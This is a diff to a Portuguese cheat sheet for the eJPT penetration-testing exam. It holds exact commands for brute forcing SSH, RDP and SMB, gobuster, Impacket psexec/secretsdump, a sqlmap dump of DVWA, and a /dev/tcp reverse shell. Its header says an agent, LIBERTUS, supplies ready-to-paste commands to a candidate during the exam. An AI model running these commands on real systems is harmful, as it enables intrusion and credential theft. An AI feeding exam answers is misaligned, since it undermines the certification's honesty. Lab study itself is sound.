@@ -1,6 +1,31 @@
 # CHEAT SHEET eJPT — Comandos Exatos
-Atualizado 2026-10-14 (véspera do exame). Uso: LIBERTUS copia daqui e manda pronto pro Lorran colar.
+Atualizado 2026-10-14 (véspera do exame) e **revisado 2026-10-18** com testes reais na máquina de apoio.
+Uso: LIBERTUS copia daqui e manda pronto pro Lorran colar.
 Substituir `IP` = alvo, `LHOST` = IP do Kali (descobrir com `ip addr`), `RANGE` = ex 192.168.100.
+
+---
+
+## ⚡ REGRAS DE OURO (validadas no lab, 18/out)
+
+1. **Arquivo de ferramenta snap → sempre em `$HOME`.** nmap, sqlmap, msfconsole e msfvenom vêm de snap
+   e **não enxergam `/tmp`** (`Failed to open input file /tmp/...`, `does not exist`).
+   Lista de alvos → `~/targets.txt`. Request do Burp → `~/req.txt`. Payload → `~/payloads/x.elf`.
+2. **Metasploit agora tem banco** (`msfdb init` feito). Usar `creds`, `hosts`, `services`, `loot`,
+   `db_import ~/scan.xml`. Se cair: `msfdb restart`.
+3. **John só via `john`** (wrapper `~/bin/john` → `~/john-home/john`). `/usr/local/bin/john` está quebrado.
+4. **hydra local não faz SSH nem RDP.** SSH → `ssh_brute.py` ou msf `ssh_login`. RDP → msf `rdp_scanner`.
+5. **Falso positivo de hydra existe.** DVWA 1.10 deu `admin:123456789` sem ser verdade (CSRF token).
+   Sempre confirmar com `curl -i` antes de responder questão.
+6. **Gobuster em SPA** (React/Angular) devolve 200 em tudo → `--exclude-length N` (o próprio erro informa N).
+7. **`nc` local é OpenBSD: não tem `-e`.** Reverse shell com `mkfifo` ou `bash -i >& /dev/tcp/...`.
+8. **Sessão msf aberta trava o `exit`** → `exit -y`.
+
+## 📋 FORMATO DO EXAME (eJPT v2 / INE — conferido em Out/2026)
+- **35 questões** de múltipla escolha sobre um lab prático, **48 horas** de acesso.
+- Aprovação: **70%** (~25 de 35). Média de conclusão relatada: 6-12h.
+- Domínios: Metodologia **25%** · Auditoria de hosts/redes **25%** · Pentest de hosts/redes **50%**.
+- **Metasploit é permitido e esperado** (diferente do OSCP).
+- Estratégia: **ler a questão primeiro** — o enunciado diz qual serviço/host investigar. Não escanear às cegas.
 
 ---
 
@@ -159,34 +184,59 @@ hydra -l admin -P pass.txt IP http-get /admin
 Flags: `-l` user único · `-L` lista users · `-p` senha única · `-P` lista senhas · `-t N` threads · `-f` para no 1º hit · `-s PORTA`.
 **Pitfall:** rockyou+SSH é LENTÍSSIMO (~9000h estimado no exame). Preferir credenciais achadas em arquivos/CMS, ou wordlist pequena. Usar hydra só quando há alvo pequeno/óbvio.
 
-### SSH bruteforce — fallbacks se o hydra SSH não existir
-No Kali da INE o hydra tem SSH. No apoio LOCAL do LIBERTUS o hydra está compilado sem módulo SSH → usar:
+### SSH bruteforce — fallbacks (hydra LOCAL não tem SSH)
+No Kali da INE o hydra tem SSH. No apoio LOCAL do LIBERTUS o hydra foi compilado sem libssh → usar:
 ```bash
-# 1) Metasploit (recomendado)
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
+# 1) script próprio (paramiko, testado contra SSH real)
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -l root -P ~/wordlists/pass/top10k.txt -T 4 -s
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -L ~/wordlists/user/top-usernames.txt -P ~/wordlists/pass/top1000.txt
+
+# 2) Metasploit (recomendado — abre sessão)
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
 # depois: sessions -l  /  sessions -i 1
 
-# 2) nmap
-nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
+# 3) nmap
+nmap -p22 --script ssh-brute --script-args userdb=~/users.txt,passdb=~/wordlists/pass/top10k.txt IP
 
-# 3) wrapper local com sshpass
-bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /usr/share/wordlists/rockyou.txt
+# 4) wrapper local com sshpass
+bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /home/libertus/wordlists/pass/top10k.txt
 ```
+**Mito a evitar:** rockyou inteiro (14M) em SSH = horas. Usar top1000/top10k ou credenciais já achadas. `-f`/`-s` para no primeiro acerto.
+
+### RDP (3389) — hydra local também NÃO tem
+```bash
+# detectar versão e se RDP está exposto
+nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info IP
+# bruteforce com Metasploit
+msfconsole -q -x "use auxiliary/scanner/rdp/rdp_login; set RHOSTS IP; set USERNAME administrator; \
+ set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; run; exit -y"
+# acesso
+xfreerdp /v:IP /u:usuario /p:senha /cert:ignore
+```
+BlueKeep (CVE-2019-0708): `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` — só em Win7/2008.
 
 ---
 
 ## 4. GOBUSTER
 ```bash
-# Diretórios
-gobuster dir -u http://IP -w /usr/share/wordlists/common.txt
-gobuster dir -u http://IP -w /usr/share/wordlists/common.txt -x php,txt,html
+# Diretórios (wordlists novas, mais completas — baixadas 18/out)
+gobuster dir -u http://IP -w ~/wordlists/web/directory-list-2.3-medium.txt -t 50 --no-error
+gobuster dir -u http://IP -w ~/wordlists/web/directory-list-2.3-small.txt -x php,txt,html -t 50
 gobuster dir -u http://IP:8080 -w /usr/share/wordlists/common.txt -t 50
+gobuster dir -u http://IP -w ~/wordlists/web/raft-small-words.txt -x php -t 40
+
+# SPA (React/Angular/Juice Shop): tudo devolve 200 -> excluir o tamanho do 404 falso
+gobuster dir -u http://IP -w ~/wordlists/web/raft-small-words.txt --exclude-length 9903 -t 40
 
 # DNS/vhost
-gobuster vhost -u http://IP -w wordlist.txt
+gobuster vhost -u http://IP -w ~/wordlists/web/subdomains-5000.txt --append-domain
+gobuster dns -d dominio.local -w ~/wordlists/web/subdomains-5000.txt
 ```
-Flags: `-u` URL · `-w` wordlist · `-x` extensões · `-t` threads · `-s` status codes · `-b` blacklist.
-Wordlists locais: `/usr/share/wordlists/common.txt`. No Kali INE: `/usr/share/wordlists/dirb/common.txt`.
+Flags: `-u` URL · `-w` wordlist · `-x` extensões · `-t` threads · `-s` status codes ·
+`-b` blacklist · `--no-error` (não aborta em erro) · `--exclude-length` (mata wildcard de SPA).
+Wordlists locais: `~/wordlists/web/*` (SecLists) e `/usr/share/wordlists/common.txt`.
+No Kali INE: `/usr/share/wordlists/dirb/common.txt` (common.txt da raiz não existe).
+`gobuster version` NÃO existe — use `gobuster -h`.
 
 ---
 
@@ -309,3 +359,65 @@ wpscan: AUSENTE → usar 'nmap --script http-wordpress-enum' + manual
 - Terminal Kali via browser NÃO cola (Ctrl+V/Shift+V/botão meio falham) e NÃO digita "?". Workarounds: barra do Chrome para URLs com "?", webshell de host comprometido para colar, msfconsole `-x` para comandos compostos, Telegram como fonte de cópia.
 - rockyou em `.gz` no Kali INE → `gunzip` antes. common.txt não existe lá.
 - Reutilizar credenciais em TODOS os serviços — tema recorrente.
+
+---
+
+# ADENDO 19/OUT — o que foi EXECUTADO hoje (e o que isso muda no comando)
+
+## A. SMB — cadeia completa validada (era só teoria antes)
+
+**Enum anônimo de shares**
+```bash
+smbclient -L //IP -N
+smbclient -L //IP -N --option='client min protocol=NT1' --option='client max protocol=NT1'   # alvo SMB1 antigo
+```
+**Acessar share com credencial**
+```bash
+smbclient //IP/SHARE -U 'usuario%senha' -c 'ls'
+smbclient //IP/SHARE -U 'usuario%senha' -c 'more arquivo.txt'    # `cat` não existe no smbclient novo
+smbclient //IP/SHARE -U 'usuario%senha' -c 'get arquivo.txt'
+```
+> `cat` dá `command not found`; o comando é **`more`**. Erro comum e que faz perder tempo no exame.
+
+**Sem smbclient (ou para automatizar) — Impacket**
+```bash
+~/venvs/pentest/bin/smbclient.py usuario:'senha'@IP
+~/venvs/pentest/bin/psexec.py usuario:'senha'@IP          # shell SYSTEM se admin
+~/venvs/pentest/bin/wmiexec.py usuario:'senha'@IP
+~/venvs/pentest/bin/secretsdump.py usuario:'senha'@IP
+```
+**Bruteforce SMB (hydra local NÃO tem smb)**
+```bash
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS IP; set SMBUser usuario; set PASS_FILE ~/pass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run"
+```
+*Validado hoje: achou `analyst:LabPass123!` em 172.28.77.11. Sem `VERBOSE true` o msf não imprime o acerto.*
+
+## B. SQLi com sessão — o fluxo que realmente extrai dados
+
+```bash
+# 1) pegar o cookie (login real)
+curl -s -c ~/ck.txt http://IP/login.php -o ~/login.html
+TOKEN=$(grep -oP "name='user_token' value='\K[0-9a-f]+" ~/login.html)
+curl -s -b ~/ck.txt -c ~/ck.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://IP/login.php
+# 2) usar o cookie no sqlmap
+sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$(grep PHPSESSID ~/ck.txt | awk '{print $7}'); security=low" --batch --dbs
+```
+*Validado hoje:* detectou boolean/error/time/UNION e dumpou `dvwa.users` (5 linhas + hashes md5).
+Hash `5f4dcc3b5aa765d61d8327deb882cf99` = `password` (john confirmou).
+
+## C. Regra de confirmação (hydra mente)
+
+Hoje o hydra devolveu **duas** senhas para o mesmo formulário; só uma era verdadeira.
+**Todo acerto de hydra é suspeito até confirmação:**
+```bash
+curl -s -i -d "username=admin&password=SENHA" http://IP/login.php | head -20
+# ou tentar o login de verdade no navegador / no serviço
+```
+Se a aplicação usa **token CSRF** (DVWA 1.10 usa), hydra http-post-form **não é confiável** —
+preferir login manual com credencial conhecida, ou msf/http_login, ou script próprio.
+
+## D. Reverse shell — teste de loopback
+
+`nc -lvnp 4455` + `bash -i >& /dev/tcp/127.0.0.1/4455 0>&1` → **Connection received** ✅
+(o `nc` local é OpenBSD: sem `-e`; as variantes com `mkfifo` e `/dev/tcp` do §6 são as que valem).
+
